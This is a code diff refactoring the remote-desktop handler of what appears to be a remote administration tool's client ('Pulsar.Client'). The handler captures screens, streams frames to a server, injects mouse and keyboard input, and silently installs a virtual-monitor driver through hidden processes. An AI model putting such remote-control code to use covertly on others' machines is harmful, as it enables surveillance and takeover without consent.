@@ -72,6 +72,7 @@ namespace Pulsar.Client.Messages
         private static extern bool SetThreadDesktop(IntPtr hDesktop);
 
         private const int CURSOR_SHOWING = 0x00000001;
+
         [StructLayout(LayoutKind.Sequential)]
         private struct CURSORINFO_NATIVE
         {
@@ -80,9 +81,11 @@ namespace Pulsar.Client.Messages
             public IntPtr hCursor;
             public POINT ScreenPosition;
         }
+
         [DllImport("user32.dll")]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool GetCursorInfo(out CURSORINFO_NATIVE pci);
+
         [DllImport("user32.dll")]
         private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
 
@@ -116,7 +119,7 @@ namespace Pulsar.Client.Messages
         private int _pendingFrameRequests = 0;
 
         private const int MAX_BUFFER_SIZE = 3;
-        
+
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
         private float _lastFrameRate = 0f;
@@ -127,19 +130,23 @@ namespace Pulsar.Client.Messages
         private Thread _drawingThread;
         private bool _drawingThreadRunning = false;
 
-
         private IntPtr _linearFrameBuffer = IntPtr.Zero;
         private int _linearBufferSize = 0;
         private int _linearWidth = 0, _linearHeight = 0;
 
-        public override bool CanExecute(IMessage message) => message is GetDesktop ||
-                                                             message is DoMouseEvent ||
-                                                             message is DoKeyboardEvent ||
-                                                             message is DoDrawingEvent ||
-                                                             message is GetMonitors ||
-                                                             message is DoInstallVirtualMonitor ||
-                                                             message is DoUninstallVirtualMonitor ||
-                                                             message is StartProcessOnMonitor;
+        private MemoryStream _reusableStream;
+
+        private bool _disposed;
+
+        public override bool CanExecute(IMessage message) =>
+            message is GetDesktop ||
+            message is DoMouseEvent ||
+            message is DoKeyboardEvent ||
+            message is DoDrawingEvent ||
+            message is GetMonitors ||
+            message is DoInstallVirtualMonitor ||
+            message is DoUninstallVirtualMonitor ||
+            message is StartProcessOnMonitor;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -178,13 +185,16 @@ namespace Pulsar.Client.Messages
 
         private void EnsureDrawingThreadIsRunning()
         {
-            if (!_drawingThreadRunning)
+            if (_drawingThreadRunning)
+                return;
+
+            _drawingThreadRunning = true;
+            _drawingThread = new Thread(DrawingThreadProc)
             {
-                _drawingThreadRunning = true;
-                _drawingThread = new Thread(DrawingThreadProc);
-                _drawingThread.IsBackground = true;
-                _drawingThread.Start();
-            }
+                IsBackground = true,
+                Name = "RemoteDesktopDrawingThread"
+            };
+            _drawingThread.Start();
         }
 
         private void DrawingThreadProc()
@@ -193,7 +203,8 @@ namespace Pulsar.Client.Messages
             {
                 while (_drawingThreadRunning)
                 {
-                    _drawingSignal.WaitOne();
+                    // Wake up either when signaled or periodically so Dispose can exit
+                    _drawingSignal.WaitOne(500);
 
                     while (_drawingQueue.TryDequeue(out Action drawAction))
                     {
@@ -222,19 +233,21 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, GetDesktop message)
         {
-            if (message.Status == RemoteDesktopStatus.Stop)
+            switch (message.Status)
             {
-                StopScreenStreaming();
-            }
-            else if (message.Status == RemoteDesktopStatus.Start)
-            {
-                StartScreenStreaming(client, message);
-            }
-            else if (message.Status == RemoteDesktopStatus.Continue)
-            {
-                // server is requesting more frames
-                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
-                _frameRequestEvent.Set();
+                case RemoteDesktopStatus.Stop:
+                    StopScreenStreaming();
+                    break;
+
+                case RemoteDesktopStatus.Start:
+                    StartScreenStreaming(client, message);
+                    break;
+
+                case RemoteDesktopStatus.Continue:
+                    // server is requesting more frames
+                    Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
+                    _frameRequestEvent.Set();
+                    break;
             }
         }
 
@@ -243,22 +256,32 @@ namespace Pulsar.Client.Messages
             Debug.WriteLine("Starting remote desktop session");
 
             var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
-            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
+            var resolution = new Resolution
+            {
+                Height = monitorBounds.Height,
+                Width = monitorBounds.Width
+            };
 
+            // Initialize or reinitialize codec when needed
             if (_streamCodec == null)
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-
-            if (message.CreateNew)
             {
-                _streamCodec?.Dispose();
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                OnReport("Remote desktop session started");
             }
-
-            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+            else
             {
-                _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                bool needsReinit =
+                    message.CreateNew ||
+                    _streamCodec.ImageQuality != message.Quality ||
+                    _streamCodec.Monitor != message.DisplayIndex ||
+                    !_streamCodec.Resolution.Equals(resolution);
+
+                if (needsReinit)
+                {
+                    try { _streamCodec.Dispose(); } catch { }
+                    _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                    if (message.CreateNew)
+                        OnReport("Remote desktop session started");
+                }
             }
 
             _displayIndex = message.DisplayIndex;
@@ -273,7 +296,10 @@ namespace Pulsar.Client.Messages
 
             if (_captureThread == null || !_captureThread.IsAlive)
             {
+                _cancellationTokenSource?.Cancel();
+                _cancellationTokenSource?.Dispose();
                 _cancellationTokenSource = new CancellationTokenSource();
+
                 _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token))
                 {
                     IsBackground = true,
@@ -288,12 +314,23 @@ namespace Pulsar.Client.Messages
         {
             Debug.WriteLine("Stopping remote desktop session");
 
-            _cancellationTokenSource?.Cancel();
+            try
+            {
+                _cancellationTokenSource?.Cancel();
+            }
+            catch { }
 
             if (_captureThread != null && _captureThread.IsAlive)
             {
                 _frameRequestEvent.Set(); // wake up thread
-                _captureThread.Join();
+                try
+                {
+                    if (!_captureThread.Join(1000))
+                    {
+                        Debug.WriteLine("Capture thread did not terminate in 1s.");
+                    }
+                }
+                catch { }
                 _captureThread = null;
             }
 
@@ -305,9 +342,7 @@ namespace Pulsar.Client.Messages
                     {
                         _desktop.UnlockBits(_desktopData);
                     }
-                    catch
-                    {
-                    }
+                    catch { }
                     _desktopData = null;
                 }
                 _desktop.Dispose();
@@ -316,35 +351,39 @@ namespace Pulsar.Client.Messages
 
             if (_streamCodec != null)
             {
-                _streamCodec.Dispose();
+                try { _streamCodec.Dispose(); }
+                catch { }
                 _streamCodec = null;
             }
 
-            // clean up gpu bs
+            // clean up GPU resources
             if (_useGPU)
             {
-                ScreenHelperGPU.CleanupResources();
+                try { ScreenHelperGPU.CleanupResources(); }
+                catch { }
             }
 
-            // clear the buff
+            // free linear buffer
+            if (_linearFrameBuffer != IntPtr.Zero)
+            {
+                try { Marshal.FreeHGlobal(_linearFrameBuffer); }
+                catch { }
+                _linearFrameBuffer = IntPtr.Zero;
+                _linearBufferSize = 0;
+                _linearWidth = 0;
+                _linearHeight = 0;
+            }
+
+            // clear the buffer
             ClearFrameBuffer();
             Interlocked.Exchange(ref _pendingFrameRequests, 0);
         }
 
         private void BufferedCaptureLoop(CancellationToken cancellationToken)
         {
-            Debug.WriteLine("Starting simplified buffered capture loop");
-            
-            try
-            {
-                Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
-                Debug.WriteLine("Set process priority to High for optimal capture performance");
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Could not set process priority: {ex.Message}");
-            }
-            
+            Debug.WriteLine("Starting buffered capture loop");
+
+            _stopwatch.Reset();
             _stopwatch.Start();
 
             bool success = SetThreadDesktop(Settings.OriginalDesktopPointer);
@@ -364,15 +403,21 @@ namespace Pulsar.Client.Messages
                 {
                     if (_pendingFrameRequests <= 0)
                     {
-                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}");
+                        // No pending frames; wait for request or cancellation
                         _frameRequestEvent.WaitOne(500);
-                        
                         if (cancellationToken.IsCancellationRequested)
                             break;
                         continue;
                     }
 
-                    // 60 fps throttle give or take
+                    // simple backpressure: if buffer is full, try sending first before capturing more
+                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE)
+                    {
+                        DequeueAndSendPendingFrames();
+                        continue;
+                    }
+
+                    // 60 fps throttle give or take (for GPU mode)
                     if (_useGPU)
                     {
                         var now = DateTime.UtcNow;
@@ -393,47 +438,37 @@ namespace Pulsar.Client.Messages
                         lastCaptureTime = DateTime.UtcNow;
                     }
 
-                    // capture frame and add to buffer
                     byte[] frameData = CaptureFrame();
                     if (frameData != null)
                     {
                         if (_frameBuffer.Count >= MAX_BUFFER_SIZE)
                         {
-                            _frameBuffer.TryDequeue(out _); // Remove oldest frame
+                            _frameBuffer.TryDequeue(out _); // drop oldest
                         }
-                        
+
                         _frameBuffer.Enqueue(frameData);
 
-                        // increment frame counter for statistics
                         _frameCount++;
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
-                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
+                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer: {_frameBuffer.Count}, Pending: {_pendingFrameRequests}");
                             _lastFrameRate = _frameCount;
                             _frameCount = 0;
                             _stopwatch.Restart();
                         }
                     }
 
-                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
-                    {
-                        var isLastFrame = Interlocked.Decrement(ref _pendingFrameRequests) == 0;
-                        var capturedFrame = frameToSend;
-                        
-                        Task.Run(() => SendFrameToServer(capturedFrame, isLastFrame));
-                    }
+                    DequeueAndSendPendingFrames();
                 }
                 catch (Exception ex)
                 {
                     Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
-                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
+                    Thread.Sleep(100); // avoid tight error loop
                 }
             }
 
             Debug.WriteLine("Buffered capture loop ended");
         }
-
-        private MemoryStream _reusableStream;
 
         private MemoryStream ReusableStream
         {
@@ -441,12 +476,12 @@ namespace Pulsar.Client.Messages
             {
                 if (_reusableStream == null)
                 {
-                    _reusableStream = new MemoryStream();
+                    _reusableStream = new MemoryStream(256 * 1024); // start with 256KB
                 }
                 return _reusableStream;
             }
         }
-        
+
         private byte[] CaptureFrame()
         {
             try
@@ -461,7 +496,8 @@ namespace Pulsar.Client.Messages
                             ReusableStream.SetLength(0);
                         }
 
-                        if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
+                        if (_streamCodec == null)
+                            throw new Exception("StreamCodec can not be null.");
 
                         IntPtr srcPtr;
                         int expectedStride = mapped.Width * 4;
@@ -488,7 +524,8 @@ namespace Pulsar.Client.Messages
 
                         TryDrawCursorOnBuffer(srcPtr, mapped.Width, mapped.Height, expectedStride, _displayIndex);
 
-                        _streamCodec.CodeImage(srcPtr,
+                        _streamCodec.CodeImage(
+                            srcPtr,
                             new Rectangle(0, 0, mapped.Width, mapped.Height),
                             new Size(mapped.Width, mapped.Height),
                             mapped.PixelFormat,
@@ -504,7 +541,9 @@ namespace Pulsar.Client.Messages
                     return null;
                 }
 
-                _desktop = _useGPU ? ScreenHelperGPU.CaptureScreen(_displayIndex) : ScreenHelperCPU.CaptureScreen(_displayIndex);
+                _desktop = _useGPU
+                    ? ScreenHelperGPU.CaptureScreen(_displayIndex)
+                    : ScreenHelperCPU.CaptureScreen(_displayIndex);
 
                 if (_desktop == null)
                 {
@@ -534,8 +573,10 @@ namespace Pulsar.Client.Messages
                     }
                 }
 
-                _desktopData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
-                    ImageLockMode.ReadOnly, processedBitmap.PixelFormat);
+                _desktopData = processedBitmap.LockBits(
+                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    ImageLockMode.ReadOnly,
+                    processedBitmap.PixelFormat);
 
                 if (ReusableStream.Length > 0)
                 {
@@ -543,11 +584,15 @@ namespace Pulsar.Client.Messages
                     ReusableStream.SetLength(0);
                 }
 
-                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                _streamCodec.CodeImage(_desktopData.Scan0,
+                if (_streamCodec == null)
+                    throw new Exception("StreamCodec can not be null.");
+
+                _streamCodec.CodeImage(
+                    _desktopData.Scan0,
                     new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     new Size(processedBitmap.Width, processedBitmap.Height),
-                    processedBitmap.PixelFormat, ReusableStream);
+                    processedBitmap.PixelFormat,
+                    ReusableStream);
 
                 return ReusableStream.ToArray();
             }
@@ -568,6 +613,18 @@ namespace Pulsar.Client.Messages
             }
         }
 
+        private void DequeueAndSendPendingFrames()
+        {
+            while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
+            {
+                var isLastFrame = Interlocked.Decrement(ref _pendingFrameRequests) == 0;
+                var capturedFrame = frameToSend;
+
+                // still async, but offloads per-frame send
+                Task.Run(() => SendFrameToServer(capturedFrame, isLastFrame));
+            }
+        }
+
         private void EnsureLinearBuffer(int width, int height)
         {
             int needed = width * height * 4;
@@ -575,12 +632,14 @@ namespace Pulsar.Client.Messages
             {
                 if (_linearFrameBuffer != IntPtr.Zero)
                 {
-                    Marshal.FreeHGlobal(_linearFrameBuffer);
+                    try { Marshal.FreeHGlobal(_linearFrameBuffer); }
+                    catch { }
                     _linearFrameBuffer = IntPtr.Zero;
                 }
                 _linearFrameBuffer = Marshal.AllocHGlobal(needed);
                 _linearBufferSize = needed;
-                _linearWidth = width; _linearHeight = height;
+                _linearWidth = width;
+                _linearHeight = height;
             }
         }
 
@@ -589,7 +648,8 @@ namespace Pulsar.Client.Messages
             try
             {
                 var ci = new CURSORINFO_NATIVE { cbSize = Marshal.SizeOf(typeof(CURSORINFO_NATIVE)) };
-                if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING) return;
+                if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING)
+                    return;
 
                 var bounds = Screen.AllScreens[monitorIndex].Bounds;
                 using (var bmp = new Bitmap(width, height, stride, PixelFormat.Format32bppArgb, buffer))
@@ -606,12 +666,15 @@ namespace Pulsar.Client.Messages
                     }
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
         {
-            if (frameData == null || _clientMain == null) return;
+            if (frameData == null || _clientMain == null || _streamCodec == null)
+                return;
 
             try
             {
@@ -693,7 +756,7 @@ namespace Pulsar.Client.Messages
                 Debug.WriteLine($"Error executing keyboard event: {ex.Message}");
             }
         }
-        
+
         private void Execute(ISender sender, DoDrawingEvent message)
         {
             try
@@ -726,9 +789,7 @@ namespace Pulsar.Client.Messages
         private void Execute(ISender client, GetMonitors message)
         {
             int screenCountTotal = DisplayManager.GetDisplayCount();
-
             Debug.WriteLine(screenCountTotal);
-
             client.Send(new GetMonitorsResponse { Number = screenCountTotal });
         }
 
@@ -771,28 +832,29 @@ namespace Pulsar.Client.Messages
 
             extractPath = Path.Combine(extractPath, "usbmmidd_v2");
 
-            // deviceinstaller64.exe install usbmmIdd.inf usbmmidd
-            // deviceinstaller64.exe enableidd 1
-
             // install the driver
             string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
             string arguments = $"install {Path.Combine(extractPath, "usbmmIdd.inf")} usbmmidd";
-            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
+            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments)
+            {
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                CreateNoWindow = true,
+                RedirectStandardError = true
+            };
 
             Process p = Process.Start(psi);
             p.WaitForExit();
 
             // enable the driver
             arguments = "enableidd 1";
-            psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
+            psi = new ProcessStartInfo(installPath, arguments)
+            {
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                CreateNoWindow = true,
+                RedirectStandardError = true
+            };
 
             p = Process.Start(psi);
             p.WaitForExit();
@@ -802,13 +864,17 @@ namespace Pulsar.Client.Messages
         {
             string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2", "usbmmidd_v2");
             string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
+
             // disable the driver
             string arguments = "enableidd 0";
-            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
+            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments)
+            {
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                CreateNoWindow = true,
+                RedirectStandardError = true
+            };
+
             Process p = Process.Start(psi);
             p.WaitForExit();
         }
@@ -863,10 +929,10 @@ namespace Pulsar.Client.Messages
                 if (message.MonitorID < 0 || message.MonitorID >= allScreens.Length)
                 {
                     Debug.WriteLine($"Invalid monitor ID: {message.MonitorID}. Using primary monitor instead.");
-                    message.MonitorID = 0; // default to primary
+                    message.MonitorID = 0;
                 }
-                Screen targetScreen = allScreens[message.MonitorID];
 
+                Screen targetScreen = allScreens[message.MonitorID];
                 var workingArea = targetScreen.WorkingArea;
                 int startX = workingArea.Left;
                 int startY = workingArea.Top;
@@ -905,35 +971,35 @@ namespace Pulsar.Client.Messages
                                 if (hWnd != IntPtr.Zero)
                                 {
                                     Debug.WriteLine($"Found window handle after {attempt * 100}ms, positioning on monitor {message.MonitorID}");
-                                    
+
                                     Screen[] screens = Screen.AllScreens;
                                     if (message.MonitorID >= 0 && message.MonitorID < screens.Length)
                                     {
                                         var bounds = screens[message.MonitorID].WorkingArea;
-                                        
+
                                         NativeMethods.SetWindowPos(
-                                            hWnd, 
-                                            IntPtr.Zero, 
-                                            bounds.X, 
-                                            bounds.Y, 
-                                            bounds.Width, 
+                                            hWnd,
+                                            IntPtr.Zero,
+                                            bounds.X,
+                                            bounds.Y,
+                                            bounds.Width,
                                             bounds.Height,
                                             NativeMethodsHelper.SWP_NOZORDER | NativeMethodsHelper.SWP_SHOWWINDOW);
-                                        
+
                                         Debug.WriteLine($"Window positioned at ({bounds.X}, {bounds.Y}) with size ({bounds.Width}x{bounds.Height})");
-                                        
+
                                         Thread.Sleep(300);
-                                        
+
                                         NativeMethods.SetWindowPos(
-                                            hWnd, 
-                                            IntPtr.Zero, 
-                                            bounds.X, 
-                                            bounds.Y, 
-                                            bounds.Width, 
+                                            hWnd,
+                                            IntPtr.Zero,
+                                            bounds.X,
+                                            bounds.Y,
+                                            bounds.Width,
                                             bounds.Height,
                                             NativeMethodsHelper.SWP_NOZORDER | NativeMethodsHelper.SWP_SHOWWINDOW);
                                     }
-                                    
+
                                     break;
                                 }
                             }
@@ -941,7 +1007,7 @@ namespace Pulsar.Client.Messages
                             {
                                 Debug.WriteLine($"Error getting window handle: {ex.Message}");
                             }
-                            
+
                             Thread.Sleep(100);
                         }
                     }
@@ -951,7 +1017,7 @@ namespace Pulsar.Client.Messages
                     }
                 });
 
-                Debug.WriteLine($"Process started, window positioning in progress");
+                Debug.WriteLine("Process started, window positioning in progress");
             }
             catch (Exception ex)
             {
@@ -966,40 +1032,88 @@ namespace Pulsar.Client.Messages
         {
             Dispose(true);
             GC.SuppressFinalize(this);
-        }        
-        
+        }
+
         protected virtual void Dispose(bool disposing)
         {
+            if (_disposed)
+                return;
+
             if (disposing)
             {
-                StopScreenStreaming();
-                _streamCodec?.Dispose();
-                _cancellationTokenSource?.Dispose();
-                _frameRequestEvent?.Dispose();
-                _reusableStream?.Dispose();
-                
+                try
+                {
+                    StopScreenStreaming();
+                }
+                catch { }
+
+                try
+                {
+                    _streamCodec?.Dispose();
+                }
+                catch { }
+                _streamCodec = null;
+
+                try
+                {
+                    _cancellationTokenSource?.Dispose();
+                }
+                catch { }
+                _cancellationTokenSource = null;
+
+                try
+                {
+                    _frameRequestEvent?.Dispose();
+                }
+                catch { }
+
+                try
+                {
+                    _reusableStream?.Dispose();
+                }
+                catch { }
+
                 _drawingThreadRunning = false;
                 _drawingSignal.Set();
+
                 if (_drawingThread != null && _drawingThread.IsAlive)
                 {
-                    _drawingThread.Join(1000);
+                    try
+                    {
+                        _drawingThread.Join(1000);
+                    }
+                    catch { }
                 }
-                _drawingSignal.Dispose();
-                _screenOverlay?.Dispose();
+
+                try
+                {
+                    _drawingSignal.Dispose();
+                }
+                catch { }
+
+                try
+                {
+                    _screenOverlay?.Dispose();
+                }
+                catch { }
 
                 // Clean up GPU resources
                 if (_useGPU)
                 {
-                    ScreenHelperGPU.CleanupResources();
+                    try { ScreenHelperGPU.CleanupResources(); }
+                    catch { }
                 }
 
                 if (_linearFrameBuffer != IntPtr.Zero)
                 {
-                    Marshal.FreeHGlobal(_linearFrameBuffer);
+                    try { Marshal.FreeHGlobal(_linearFrameBuffer); }
+                    catch { }
                     _linearFrameBuffer = IntPtr.Zero;
                     _linearBufferSize = 0;
                 }
             }
+
+            _disposed = true;
         }
     }
 }
